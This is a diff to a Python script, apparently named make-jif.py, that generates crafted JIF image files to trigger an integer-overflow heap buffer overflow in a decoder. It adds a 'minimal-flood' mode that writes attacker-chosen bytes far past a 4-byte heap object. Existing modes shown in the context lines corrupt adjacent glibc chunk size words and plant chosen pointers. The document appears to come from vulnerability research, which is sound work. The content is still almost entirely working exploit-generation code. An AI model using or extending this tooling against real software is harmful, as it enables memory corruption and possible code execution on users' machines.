@@ -15,7 +15,7 @@ Usage: make-jif.py OUT (bytes HEXBYTE | ptr | published HEXBYTE |
                         minimal-size | minimal-ptr HEXADDR |
                         minimal-noob HEXBYTE | large HEXBYTE |
                         large-run N HEXBYTE | large-hex HEXSTRING |
-                        large-size HEXADDR)
+                        large-size HEXADDR | minimal-flood N HEXBYTE)
 `minimal-size` and `minimal-ptr` keep the 40-byte minimal-geometry zlib
 payload but preserve the adjacent glibc chunk size word at indexes+24
 (0x41), changing only that chunk's first user word at +32. They isolate
@@ -25,6 +25,8 @@ chunk-metadata corruption from chosen-pointer use; they claim no deref.
 product `0x80007fff`, alpha `data_size=65534`) and writes ~32 KiB past
 the 64 KiB `indexes` chunk; `large-run` and `large-hex` vary that span.
 `large-size` preserves the adjacent free chunk size word at `indexes+65544`.
+`minimal-flood` keeps the minimal geometry but inflates to N chosen bytes,
+writing N-4 bytes past the 4-byte `indexes`; N must compress into 1020 bytes.
 """
 import struct
 import sys
@@ -70,6 +72,12 @@ elif kind in ("minimal-size", "minimal-ptr"):
     plain = b"\x4d" * 24 + struct.pack("<Q", 0x41) + struct.pack("<Q", word)
 elif kind == "minimal-noob":
     plain = bytes([int(sys.argv[3], 16)]) * 4
+elif kind == "minimal-flood":
+    # W343: highly compressible payload; the wrapped data_size stays 4
+    # while the inflated span reaches far past the 4-byte indexes object.
+    plain = bytes([int(sys.argv[4], 16)]) * int(sys.argv[3])
+    assert len(zlib.compress(plain, 9)) <= 4 * 255
+
 elif kind == "large-size":
     LEN, HEIGHT = 65535, 32769
     plain = bytearray(b"\x4d" * (65534 + 32773))
@@ -90,7 +98,8 @@ elif kind in ("large", "large-run", "large-hex"):
         plain = bytes([byte]) * nbytes
 else:
     raise SystemExit("unknown mode")
-if kind in ("bytes", "ptr", "minimal-size", "minimal-ptr", "minimal-noob"):
+if kind in ("bytes", "ptr", "minimal-size", "minimal-ptr", "minimal-noob",
+            "minimal-flood"):
     assert LEN * HEIGHT == 0x80000002
     assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 4
 elif kind in ("published", "published-long", "published-mix",
